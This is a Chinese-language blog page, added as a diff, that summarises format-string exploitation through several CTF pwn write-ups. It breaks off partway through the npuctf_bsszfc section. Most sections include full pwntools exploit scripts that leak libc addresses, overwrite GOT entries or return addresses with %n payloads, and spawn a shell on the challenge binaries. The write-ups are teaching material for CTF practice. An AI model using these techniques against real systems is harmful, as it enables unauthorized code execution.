@@ -1,0 +1,746 @@
+<!DOCTYPE html>
+
+
+<html lang="en" >
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    格式化字符串利用总结 |  Hexo
+  </title>
+  <meta name="generator" content="hexo-theme-yilia-plus">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+  
+  
+
+  
+
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    <main class="content on">
+      <section class="outer">
+  <article id="post-geshihua" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  格式化字符串利用总结
+</h1>
+ 
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/07/01/geshihua/" class="article-date">
+  <time datetime="2020-06-30T16:00:00.000Z" itemprop="datePublished">2020-07-01</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">格式化字符串</a>
+  </div>
+
+      
+      
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">2.3k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">10 min</span>
+        </span>
+    </span>
+</div>
+
+      
+    </div>
+    
+
+    
+    
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+      
+
+      
+      <p>还没写完。。。。。。。。</p>
+<p>在这里 我不会写 泄露的原理 ，只讲改写方面的技巧和方法。。。。。。<em>0 – 0</em></p>
+<a id="more"></a>
+
+<p>不过 在这 贴一个 与泄露有关的 %a 的利用</p>
+<p>publicqi师傅的  <a href="https://publicki.top/2020/04/05/hardcore_fmt/" target="_blank" rel="noopener">https://publicki.top/2020/04/05/hardcore_fmt/</a></p>
+<h1 id="栈段"><a href="#栈段" class="headerlink" title="栈段"></a>栈段</h1><h2 id="ACTF-repeat"><a href="#ACTF-repeat" class="headerlink" title="ACTF_repeat"></a>ACTF_repeat</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>先 checksec 查看一下保护情况</p>
+<p> <img src="https://ae01.alicdn.com/kf/U7dea6684f5714bb2a8ac53ae0d5af9c5t.jpg" alt="image-20200709092454705"></p>
+<p>发现没开RELRO</p>
+<p>IDA 分析</p>
+<p> <img src="https://ae01.alicdn.com/kf/Uca7375ffabe946409a5d8fb772a0690el.jpg" alt="image-20200709092809339"></p>
+<p>存在一个栈的格式化漏洞，可以多次触发。</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>由于程序没开RELRO，我们可以去改把 printf 的got 表改成 system。</p>
+<p>也可以改 返回地址 或者 puts的got表 为 one_gadget</p>
+<p>由于 改成 one_gadget 不一定过，这里 我选择改system</p>
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p> 由于在栈段上，我们需要找到输入的偏移。</p>
+<p> <img src="https://ae01.alicdn.com/kf/U98005d6256dd47deadef6213a76a4f14u.jpg" alt="1"></p>
+<p>可以 发现偏移是8</p>
+<p> <img src="https://ae01.alicdn.com/kf/Ud418b0bad7ae40ed973bfbfea4567d15u.jpg" alt="2"></p>
+<p>利用 %19$p 泄露 libc</p>
+<p> <img src="https://ae01.alicdn.com/kf/U1bba968bdf3f495bad229df6511d4247i.jpg" alt="3"></p>
+<p>在偏移13处 写入 printf 的 got表        在偏移12处 写入 prinf 的 got表+2</p>
+<p>通过 偏移12 偏移13  修改 printf 的 got表 为 syetem</p>
+<p> <img src="https://ae01.alicdn.com/kf/U8e63bcb4ea75436891168c30b091540aT.jpg" alt="4"></p>
+<p>输入 “/bin/sh” 获得shell </p>
+<p> <img src="https://ae01.alicdn.com/kf/U9493169177784ddca2edc391047bb555b.jpg" alt="image-20200709100606812"></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context(log_level="debug")</span></span><br><span class="line">p = process(<span class="string">'./repeat'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./repeat'</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"%19$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line"></span><br><span class="line">libc_base = int(p.recv(<span class="number">12</span>),<span class="number">16</span>)<span class="number">-0x20830</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base = "</span>+hex(libc_base)</span><br><span class="line">sys_addr = libc_base+<span class="number">0x45390</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"sys_addr = "</span>+hex(sys_addr)</span><br><span class="line"></span><br><span class="line">one1 = sys_addr&amp;<span class="number">0xffff</span></span><br><span class="line">one2 = sys_addr&gt;&gt;<span class="number">16</span></span><br><span class="line">one2 = one2&amp;<span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"one1 = "</span>+hex(one1)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"one2 = "</span>+hex(one2)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(one2,<span class="number">12</span>)</span><br><span class="line">payload += <span class="string">"%&#123;&#125;c%&#123;&#125;$hn"</span>.format(one1-one2,<span class="number">13</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">"a"</span>)</span><br><span class="line">payload += p64(elf.got[<span class="string">"printf"</span>]+<span class="number">2</span>)+p64(elf.got[<span class="string">"printf"</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="easy-equation"><a href="#easy-equation" class="headerlink" title="easy_equation"></a>easy_equation</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>checksec 看下保护情况</p>
+<p>  <img src="https://ae01.alicdn.com/kf/U2aea4b7734df47bcb85843209605e2eda.jpg" alt="image-20200709112349311"></p>
+<p>IDA 分析</p>
+<p><img src="https://ae01.alicdn.com/kf/Udaf87d2ca106485d9bbbb0d3ec098686T.jpg" alt="image-20200709112421342"></p>
+<p>没开canary保护 存在栈溢出</p>
+<p>存在 格式化漏洞</p>
+<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>1.直接栈溢出 覆盖返回地址为 system 地址 执行 “/bin/sh”</p>
+<p>2.格式化 改 judge 为 2 绕过判断 执行system</p>
+<h3 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h3><p>由于 思路1 太简单了 就不写了</p>
+<p>主要讲解 思路2</p>
+<p>先找到输入的偏移</p>
+<p> <img src="https://ae01.alicdn.com/kf/U29077f50936f4d44863c2e3f0a9b0db5P.jpg" alt="image-20200709113402311"></p>
+<p>很清楚的发现 B 被吃了 (前移)</p>
+<p> <img src="https://ae01.alicdn.com/kf/U130fb56dec6744c99034d08fe1c28027Z.jpg" alt="image-20200709113538485"></p>
+<p>继续 运行 发现输入的偏移 先吸收一个字节 再偏移是 8 </p>
+<p> <img src="https://ae01.alicdn.com/kf/U3f4a6ea4bbb446b98bd0f631df2be7b1d.jpg" alt="image-20200709114138414"></p>
+<p>我们需要 布置如上图的局 </p>
+<p>为撒是 20971253 呢  ？？？      2097153 = 0x200001</p>
+<p>加上前面被吸收的 B  是 0x200002  </p>
+<p>hhn 对应的是 1个字节 取的是 2</p>
+<p>故将 偏移10 的 judge 覆盖成了 2</p>
+<p> <img src="https://ae01.alicdn.com/kf/Uad6fcc55d22647d7b4eb29cbb08ea14ad.jpg" alt="image-20200709114628922"></p>
+<p>可以看到 执行完了 printf  后 judge 被修改成了 2  绕过了 if 判断 获得了 shell</p>
+<p> <img src="https://ae01.alicdn.com/kf/Ud228fcd6bc984fbaa24abce39e9a7405A.jpg" alt="image-20200709114901370"></p>
+<p>上面这种 是复杂了一点(只是为了记录这种方式)</p>
+<p>其实 只需要如下布局</p>
+<p> <img src="https://ae01.alicdn.com/kf/U1b1225ceca904320933254194da6f0b5W.jpg" alt="image-20200709121740273"></p>
+<p>同理 可shell。。。</p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">p =process(<span class="string">'./easy_equation'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">"B"</span>+<span class="string">"%"</span>+str(<span class="number">0x200001</span>)+<span class="string">"c%10$hhn"</span>+p64(<span class="number">0x060105C</span>)</span><br><span class="line"><span class="comment">#payload += "B"+"%"+"1c%10$hhn"+"aaaaaa"+p64(0x060105C)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="quantum-entanglement"><a href="#quantum-entanglement" class="headerlink" title="quantum_entanglement"></a>quantum_entanglement</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>checksec 一下 </p>
+<p> <img src="https://ae01.alicdn.com/kf/U85990f5cd9674177af91e9f97569a60bL.jpg" alt="image-20200709130623035"></p>
+<p>IDA 分析</p>
+<p> <img src="https://ae01.alicdn.com/kf/U708c58e71f94431b9d9a83c71bf29b61F.jpg" alt="image-20200709131324114"></p>
+<p> <img src="https://ae01.alicdn.com/kf/U0d449a6cea29412db35eb799c979ec4fw.jpg" alt="image-20200709131347656"></p>
+<p>在 log_in 函数中 存在两个格式化串漏洞，但每个限制最大13个字符（输入的时候限制的）</p>
+<p>我们需要 使v8 == v4 才可获得shell</p>
+<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>思路一 ：利用格式化使 v8 == v4 获得shell</p>
+<p>思路二： 在调用完了 log_in 函数后 调用了sleep ，在观察到RELRO 没开 ，我们可以改 sleep的got 表为 system(“/bin/sh”) 的位置，实现绕过判断，获得shell</p>
+<p>这里 运用了一个技巧 ：<code>%*X$d%Y$n</code>会把栈中偏移X处的<strong>值 ** 赋给栈中偏移Y处的 **指针指向的地址</strong></p>
+<p>​                                       而且%*这个格式化串是输出对应值数量的空格</p>
+<h3 id="调试-2"><a href="#调试-2" class="headerlink" title="调试"></a>调试</h3><h4 id="调试思路一"><a href="#调试思路一" class="headerlink" title="调试思路一"></a>调试思路一</h4><p>先找偏移 我们下断点到 b *0x0804876a ( printf 的前面 ) 然后运行</p>
+<p> <img src="https://ae01.alicdn.com/kf/Uacbd6245183948b78951bf95f754cafaC.jpg" alt="image-20200710032427476"></p>
+<p>然后 再找到 随机数的偏移</p>
+<p> <img src="https://ae01.alicdn.com/kf/Ucc54403537bd43b4b13f62e69d70852e6.jpg" alt="image-20200710035125282"> </p>
+<p>我们发现 在偏移19处的数据是 随机数A地址的一半 。。。</p>
+<p>这里 我们可以去找 3个栈链连起来的指针( 栈 -&gt; 栈 -&gt; 栈 ) 作为跳板 实现数据的修改</p>
+<p>这种 栈链一般在 stack 的下面找到到</p>
+<p> <img src="https://ae01.alicdn.com/kf/Ud8f0691a658241e99d508749564db18et.jpg" alt="image-20200710035815282"></p>
+<p>这 3 种都行 。。。这里我 利用第一个。(懒)</p>
+<p>计算偏移  第一个是跳板的偏移  第二个修改的偏移 </p>
+<p> <img src="https://ae01.alicdn.com/kf/U3c087544f0b546e78791c45bed5b0132D.jpg" alt="image-20200710040113534"></p>
+<p>这样思路 就非常清楚了 利用跳板 指向随机数A  修改其为随机数B</p>
+<p>制造跳板 使 0xffff742cc 指向 随机数A的地址</p>
+<p> <img src="https://ae01.alicdn.com/kf/Uaade0639e23d4702b56df02dfad1c35ew.jpg" alt="image-20200710040427780"></p>
+<p>然后 修改 随机数A 为随机数B</p>
+<p> <img src="https://ae01.alicdn.com/kf/Ubb2b605e99f440a387fdffe67899539a0.jpg" alt="image-20200710040822701"></p>
+<p>然后 获得shell。。。。。。</p>
+<p> <img src="https://ae01.alicdn.com/kf/U12524ed6b3b54bf486192a8957c55854A.jpg" alt="image-20200710041058906"></p>
+<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./quantum_entanglement'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./quantum_entanglement'</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'%*19$d%65$hn'</span> <span class="comment">#  %*19$c%65$hn</span></span><br><span class="line">payload2 = <span class="string">'%*18$d%118$n'</span> <span class="comment">#  %*18$c%118$hn</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"FirstName:"</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">"LastName:"</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="调试思路二"><a href="#调试思路二" class="headerlink" title="调试思路二"></a>调试思路二</h4><p>一样的 。 先找偏移</p>
+<p><img src="https://ae01.alicdn.com/kf/U33261aa0e64c42d99e95298752676e761.jpg" alt="image-20200710041735340"></p>
+<p>偏移 20的 是sleep_got </p>
+<p>偏移 21的是 system(“/bin/sh”)</p>
+<p>我们利用格式化 把 偏移21的值 写入 偏移20处 即可shell</p>
+<p>由于 数据太大 需要运行几分钟。。。</p>
+<p> <img src="https://ae01.alicdn.com/kf/U91cb6074c09d431381a330524a74df525.jpg" alt="image-20200710042746346"></p>
+<p>已成功 嘿嘿嘿。。。</p>
+<p> <img src="https://ae01.alicdn.com/kf/U47dbc39e25ad41e8a2e74b32b88fb459J.jpg" alt="image-20200710042945198"></p>
+<h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./quantum_entanglement'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./quantum_entanglement'</span>)</span><br><span class="line"></span><br><span class="line">sleep_got=elf.got[<span class="string">'sleep'</span>]</span><br><span class="line">backdoor=<span class="number">0x080489DB</span></span><br><span class="line"></span><br><span class="line">payload1 = p32(sleep_got)+p32(backdoor)</span><br><span class="line">payload2 = <span class="string">'%*21$c'</span> + <span class="string">'%20$n'</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"FirstName:"</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">"LastName:"</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="非栈段"><a href="#非栈段" class="headerlink" title="非栈段"></a>非栈段</h1><h2 id="SWPUCTF-2019-login"><a href="#SWPUCTF-2019-login" class="headerlink" title="SWPUCTF_2019_login"></a>SWPUCTF_2019_login</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>先checksec看一下保护开启情况。。。。。。</p>
+<p> <img src="https://ae01.alicdn.com/kf/U18cd1922d09c4dd0ac0a72733f82191b8.jpg" alt="check"></p>
+<p>发现没开RELRO</p>
+<p>IDA查看一下<img src="https://ae01.alicdn.com/kf/Ud722d0d43b144b858a0004ef62ae4fa8G.jpg" alt="IDA"></p>
+<p>在这个函数中，存在一个循环的格式化漏洞<img src="https://ae01.alicdn.com/kf/Ufe1ade19b26d49c5848a174ae4c77609p.jpg" alt="IDA2"></p>
+<p>这是一个<strong>非栈</strong>的<strong>32位</strong>格式化漏洞。</p>
+<h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>由于程序没开RELRO，我们可以去改把 printf 的got 表改成 system。</p>
+<p>由于格式化是在 bss 段，我们需要利用跳板去进行任意地址修改。</p>
+<p>我原来想改返回地址为one_gadget 然后退出判断执行，获得shell。(一个师傅和我说32位的改返回地址容易炸)没成。。。</p>
+<h3 id="调试-3"><a href="#调试-3" class="headerlink" title="调试"></a>调试</h3><p>我们先利用<strong>%6$p</strong> 与 <strong>%15$p</strong>来泄露stack 和 libc<img src="https://ae01.alicdn.com/kf/H6555baf534cf4d81be34ce4114eca015t.jpg" alt="1"></p>
+<p>我们需要找跳板，这里我用的是<strong>ebp</strong>作为跳板，来达到任意地址修改。<img src="https://ae01.alicdn.com/kf/H4150eb47c6804911b089d50647bd671dD.jpg" alt="2"></p>
+<p>第一次 改ebp指向 0xffffd074(偏移9)  第二次利用 0xffffd078(偏移10) 来修改 0xffffd074 中的值</p>
+<p>使 0xffffd074 指向 printf 的got表<img src="https://ae01.alicdn.com/kf/Ha6f02d628bc5488c8f98341639cb6f3dt.jpg" alt="3"></p>
+<p>同理 再次修改ebp 指向 0xffffd070(偏移8) 利用 0xffffd078(偏移10) 来修改 0xffffd070 中的值</p>
+<p>使 0xffffd074 指向 printf的got表高二位字节<img src="https://ae01.alicdn.com/kf/H5fcc42e2adab42dd91cc7f7a9630cf20E.jpg" alt="4"></p>
+<p>最后 利用 0xffffd070(偏移8) 作为跳板改写 printf 的got表中的高二位字节 </p>
+<p>​        利用 0xffffd074(偏移9) 作为跳板改写 printf 的got表中的低二位字节 <img src="https://ae01.alicdn.com/kf/Hae334742c56b488bb02613e9506d2f4bm.jpg" alt="5"></p>
+<p>最后利用 read  输入 /bin/sh 触发 printf(system) 获得shell<img src="https://ae01.alicdn.com/kf/U9e5e456ce1f84ab99218d6478748fb51d.jpg" alt="image-20200709050912160"></p>
+<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><p>远程的偏移 与 本地 有点差别,需要改下偏移。。。。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./SWPUCTF_2019_login'</span>)</span><br><span class="line"><span class="comment">#p = remote('node3.buuoj.cn',26584)</span></span><br><span class="line">elf = ELF(<span class="string">'./SWPUCTF_2019_login'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">p.sendline(<span class="string">"flzx3qc"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"password:"</span>)</span><br><span class="line">p.sendline(<span class="string">"stack :%6$p libc :%15$p"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"stack :0x"</span>)</span><br><span class="line">stack = int(p.recv(<span class="number">8</span>),<span class="number">16</span>)<span class="number">-4</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"stack = "</span>+hex(stack)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"libc :0x"</span>)</span><br><span class="line">libc_base = int(p.recv(<span class="number">8</span>),<span class="number">16</span>)<span class="number">-0x18e81</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base = "</span>+hex(libc_base)</span><br><span class="line"></span><br><span class="line">system = libc_base+<span class="number">0x3d200</span> <span class="comment"># 远程 0x03cd10</span></span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system = "</span>+hex(system)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"printf_got = "</span>+hex(printf_got) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 10 -&gt; 9  9 -&gt; printf got</span></span><br><span class="line">payload  =<span class="string">'%'</span> + str(stack&amp;<span class="number">0xff</span>) + <span class="string">'c'</span> +<span class="string">'%6$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!"</span>,payload)</span><br><span class="line">payload  =<span class="string">'%'</span> + str(printf_got&amp;<span class="number">0xff</span>) + <span class="string">'c'</span> +<span class="string">'%10$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!"</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10 -&gt; 8  8 -&gt; printf got+2</span></span><br><span class="line">payload = <span class="string">'%'</span> + str(stack&amp;<span class="number">0xff</span><span class="number">-4</span>) + <span class="string">'c'</span> + <span class="string">'%6$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!"</span>,payload)</span><br><span class="line">payload = <span class="string">'%'</span> + str((printf_got+<span class="number">2</span>)&amp;<span class="number">0xffff</span>) + <span class="string">'c'</span> + <span class="string">'%10$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!"</span>,payload)</span><br><span class="line"></span><br><span class="line">sys1 = system&amp;<span class="number">0xffff</span></span><br><span class="line">sys2 = system&gt;&gt;<span class="number">16</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"sys1 = "</span>+hex(sys1)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"sys2 = "</span>+hex(sys2) </span><br><span class="line"></span><br><span class="line"><span class="comment"># printf got &gt;&gt;&gt; system</span></span><br><span class="line">payload = <span class="string">'%'</span>+str(sys1)+<span class="string">'c'</span>+<span class="string">'%9$hn'</span></span><br><span class="line">payload += <span class="string">'%'</span>+str(sys2-sys1)+<span class="string">'c'</span>+<span class="string">'%8$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!"</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="xman-2019-format"><a href="#xman-2019-format" class="headerlink" title="xman_2019_format"></a>xman_2019_format</h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>先 checksec 查看下程序保护机制。。。。。。。。。</p>
+<p> <img src="https://ae01.alicdn.com/kf/U8705c80b972f4b7db074ae4e48ef75ffy.jpg" alt="check"></p>
+<p>用IDA 分析<img src="https://ae01.alicdn.com/kf/U44b6ffdb79b54346a8301ec60224d2981.jpg" alt="image-20200709054924463"></p>
+<p>里面调用了strtok 用 “|” 来分离 输入的字符串</p>
+<p>存在格式化漏洞                                                               </p>
+<p> <img src="https://ae01.alicdn.com/kf/U5b3bc2c9969f4401b69178fff139c49aP.jpg" alt="ida2"></p>
+<p>在程序中还发现存在一个 backdoor </p>
+<h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><p>改写返回地址为 backdoor </p>
+<p>由于 s执行的内存 是非栈上的 所以需要利用跳板来改写</p>
+<h3 id="调试-4"><a href="#调试-4" class="headerlink" title="调试"></a>调试</h3><p>改ebp指向 0xffb65b4c(偏移11 也是 返回地址)  利用 0xffb65b68(偏移18) 来修改 0xffb65b4c 中的值<img src="https://ae01.alicdn.com/kf/Uefd282dea72a4d779e07062216e2a0fdE.jpg" alt="1"></p>
+<p>制造跳板</p>
+<p> <img src="https://ae01.alicdn.com/kf/U50c55565970f48cbb1d6217a397d4600b.jpg" alt="2"></p>
+<p>修改</p>
+<p> <img src="https://ae01.alicdn.com/kf/Ue4a28e637f79495daac9206d4c3991114.jpg" alt="3"></p>
+<p>直接 执行 backdoor </p>
+<p> <img src="https://ae01.alicdn.com/kf/Ua25322d337414035a7d8b08a12d4bee0u.jpg" alt="image-20200709071324918"></p>
+<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><p>需要爆破1字节 1/16机率 获得shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./xman_2019_format'</span>)</span><br><span class="line"><span class="comment">#p = remote('node3.buuoj.cn',29411)</span></span><br><span class="line">elf = ELF(<span class="string">'./xman_2019_format'</span>)</span><br><span class="line">backdoor = <span class="number">0x080485AB</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%'</span> + str(<span class="number">0x4c</span>) + <span class="string">'c%10$hhn|'</span></span><br><span class="line">payload += <span class="string">'%'</span> + str(backdoor &amp; <span class="number">0xFFFF</span>) + <span class="string">'c%18$hn|'</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">'...'</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="npuctf-bsszfc"><a href="#npuctf-bsszfc" class="headerlink" title="npuctf_bsszfc"></a>npuctf_bsszfc</h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>先 checksec 一下</p>
+<p> <img src="https://ae01.alicdn.com/kf/U4f3b8ab4e2bb4fd6b78f018cd02a5618Y.jpg" alt="image-20200709072616275"></p>
+<p>IDA 分析</p>
+<p> <img src="https://ae01.alicdn.com/kf/U56bf8667381b40caa1bf9663831989c58.jpg" alt="image-20200709073227289"></p>
+<p>非常明显的格式化漏洞，输入 ‘66666666\x00’ 退出程序</p>
+<p> <img src="https://ae01.alicdn.com/kf/Ua1e2402c5cd9462186e18ad794464760d.jpg" alt="image-20200709073704604"></p>
+<p>这是一个 在bss段的 64位的 格式化漏洞</p>
